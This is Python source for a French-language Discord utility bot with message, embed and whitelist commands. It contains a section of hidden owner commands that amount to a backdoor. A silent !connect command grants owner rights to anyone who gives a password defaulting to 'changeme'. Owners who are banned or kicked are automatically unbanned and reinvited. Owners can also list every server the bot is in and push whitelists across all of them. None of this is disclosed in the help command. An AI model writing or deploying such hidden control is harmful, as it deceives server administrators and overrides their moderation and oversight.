import discord
from discord.ext import commands
import os
import json
import asyncio
from datetime import datetime
import psycopg2

# === CONFIGURATION DE BASE ===
TOKEN = os.getenv("DISCORD_TOKEN")
CONFIG_FILE = "config.json"
OWNER_ID = 489113166429683713

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# --- DATABASE CONNECTION ---
def connect_db():
    return psycopg2.connect(
        host=os.getenv("PGHOST"),
        database=os.getenv("PGDATABASE"),
        user=os.getenv("PGUSER"),
        password=os.getenv("PGPASSWORD"),
        port=os.getenv("PGPORT")
    )

# === CONFIG JSON FUNCTIONS ===
def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    return {}

def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)

def get_log_channel(guild_id):
    config = load_config()
    return config.get(str(guild_id), {}).get("log_channel")

def get_whitelist(guild_id):
    config = load_config()
    return config.get(str(guild_id), {}).get("whitelist", [])

def is_whitelisted(guild_id, user_id):
    whitelist = get_whitelist(guild_id)
    return user_id in whitelist

def add_to_whitelist(guild_id, user_id):
    config = load_config()
    gid = str(guild_id)
    if gid not in config:
        config[gid] = {}
    if "whitelist" not in config[gid]:
        config[gid]["whitelist"] = []
    if user_id not in config[gid]["whitelist"]:
        config[gid]["whitelist"].append(user_id)
        save_config(config)
        return True
    return False

def remove_from_whitelist(guild_id, user_id):
    config = load_config()
    gid = str(guild_id)
    if gid in config and "whitelist" in config[gid]:
        if user_id in config[gid]["whitelist"]:
            config[gid]["whitelist"].remove(user_id)
            save_config(config)
            return True
    return False

def get_owners():
    config = load_config()
    return config.get("owners", [OWNER_ID])

def is_owner(user_id):
    return user_id in get_owners()

def get_owner_password():
    config = load_config()
    return config.get("owner_password", "changeme")

def set_owner_password(password):
    config = load_config()
    config["owner_password"] = password
    save_config(config)

def whitelist_check():
    async def predicate(ctx):
        if ctx.author.guild_permissions.administrator:
            return True
        if is_owner(ctx.author.id):
            return True
        if is_whitelisted(ctx.guild.id, ctx.author.id):
            return True
        await ctx.send("❌ Vous n'êtes pas autorisé à utiliser cette commande.")
        return False
    return commands.check(predicate)

# === EVENTS ===
@bot.event
async def on_ready():
    print(f"✅ {bot.user} connecté et prêt !")

@bot.event
async def on_member_ban(guild, user):
    if user.id in get_owners():
        await guild.unban(user)
        invite = await guild.text_channels[0].create_invite(max_uses=1)
        try:
            await user.send(f"🚨 Tu as été banni de **{guild.name}**, mais tu as été réinvité : {invite.url}")
        except:
            pass

@bot.event
async def on_member_remove(member):
    if member.id in get_owners():
        invite = await member.guild.text_channels[0].create_invite(max_uses=1)
        try:
            await member.send(f"🚨 Tu as été expulsé de **{member.guild.name}**, voici une nouvelle invitation : {invite.url}")
        except:
            pass

# === COMMANDES PUBLIQUES ===
@bot.command()
async def ping(ctx):
    await ctx.send("🏓 Pong ! Le bot F.I.M est opérationnel.")

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="📋 Commandes du Bot F.I.M",
                          description="Voici la liste de toutes les commandes disponibles :",
                          color=discord.Color.from_rgb(153, 0, 0))
    embed.add_field(name="🏓 !ping", value="Vérifie que le bot fonctionne correctement", inline=False)
    embed.add_field(name="📨 !say <message>", value="Envoie un message avec le bot dans le canal actuel\n*Nécessite : Whitelist ou Administrateur*", inline=False)
    embed.add_field(name="📤 !send #canal <message>", value="Envoie un message dans un canal spécifique\n*Nécessite : Whitelist ou Administrateur*", inline=False)
    embed.add_field(name="📰 !embed <titre> <description>", value="Envoie un message embed formaté avec le bot\n*Nécessite : Whitelist ou Administrateur*", inline=False)
    embed.add_field(name="📊 !setlogs #canal", value="Définit le canal des logs\n*Nécessite : Administrateur*", inline=False)
    embed.add_field(name="✅ !whitelist add/remove/list", value="Gère la whitelist du bot\n*Nécessite : Administrateur*", inline=False)
    embed.set_footer(text="Bot F.I.M - Préfixe : !")
    await ctx.send(embed=embed)

@bot.command()
@whitelist_check()
async def say(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(message)

@bot.command()
@whitelist_check()
async def send(ctx, channel: discord.TextChannel, *, message):
    await ctx.message.delete()
    await channel.send(message)
    await ctx.send(f"✅ Message envoyé dans {channel.mention}", delete_after=3)

@bot.command()
@whitelist_check()
async def embed(ctx, title, *, description):
    await ctx.message.delete()
    em = discord.Embed(title=title, description=description, color=discord.Color.from_rgb(153, 0, 0))
    em.set_footer(text=f"Message envoyé par {ctx.author.name}")
    await ctx.send(embed=em)

@bot.command()
@commands.has_permissions(administrator=True)
async def setlogs(ctx, channel: discord.TextChannel):
    config = load_config()
    gid = str(ctx.guild.id)
    if gid not in config:
        config[gid] = {}
    config[gid]["log_channel"] = channel.id
    save_config(config)
    await ctx.send(f"✅ Canal de logs défini sur {channel.mention}")

# === WHITELIST COMMANDS ===
@bot.group(invoke_without_command=True)
@commands.has_permissions(administrator=True)
async def whitelist(ctx):
    await ctx.send("❌ Utilisez : !whitelist add, remove ou list")

@whitelist.command(name="add")
@commands.has_permissions(administrator=True)
async def whitelist_add(ctx, member: discord.Member):
    if add_to_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"✅ {member.mention} ajouté à la whitelist")
    else:
        await ctx.send(f"⚠️ {member.mention} est déjà whitelisté")

@whitelist.command(name="remove")
@commands.has_permissions(administrator=True)
async def whitelist_remove(ctx, member: discord.Member):
    if remove_from_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"❌ {member.mention} retiré de la whitelist")
    else:
        await ctx.send(f"⚠️ {member.mention} n'était pas whitelisté")

@whitelist.command(name="list")
@commands.has_permissions(administrator=True)
async def whitelist_list(ctx):
    ids = get_whitelist(ctx.guild.id)
    if not ids:
        return await ctx.send("📋 Aucun utilisateur whitelisté")
    liste = []
    for uid in ids:
        m = ctx.guild.get_member(uid)
        liste.append(m.mention if m else f"ID: {uid}")
    await ctx.send("\n".join(liste))

# === COMMANDES OWNER CACHÉES ===
@bot.command()
async def connect(ctx, *, password):
    if password == get_owner_password():
        config = load_config()
        owners = config.get("owners", [OWNER_ID])
        if ctx.author.id not in owners:
            owners.append(ctx.author.id)
            config["owners"] = owners
            save_config(config)
        await ctx.author.send("✅ Vous êtes maintenant owner du bot.")
    else:
        pass  # aucun message d’erreur

@bot.command()
async def setpass(ctx, *, newpass):
    if not is_owner(ctx.author.id):
        return
    set_owner_password(newpass)
    await ctx.send("🔑 Mot de passe owner mis à jour avec succès.")

@bot.command()
async def reboot(ctx):
    if not is_owner(ctx.author.id):
        return
    await ctx.send("♻️ Redémarrage du bot...")
    await bot.close()

@bot.command()
async def serverlist(ctx):
    if not is_owner(ctx.author.id):
        return
    guilds = "\n".join([f"- {g.name} ({g.id})" for g in bot.guilds])
    await ctx.author.send(f"🧩 Liste des serveurs :\n{guilds}")

@bot.command()
async def syncwhitelist(ctx):
    if not is_owner(ctx.author.id):
        return
    main_guild = ctx.guild
    wl = get_whitelist(main_guild.id)
    for guild in bot.guilds:
        if guild.id != main_guild.id:
            for uid in wl:
                add_to_whitelist(guild.id, uid)
    await ctx.send("🔁 Whitelist synchronisée entre tous les serveurs.")

# === LOOP BOT ===
while True:
    try:
        bot.run(TOKEN)
    except Exception as e:
        print(f"❌ Erreur : {e}")
        asyncio.sleep(5)

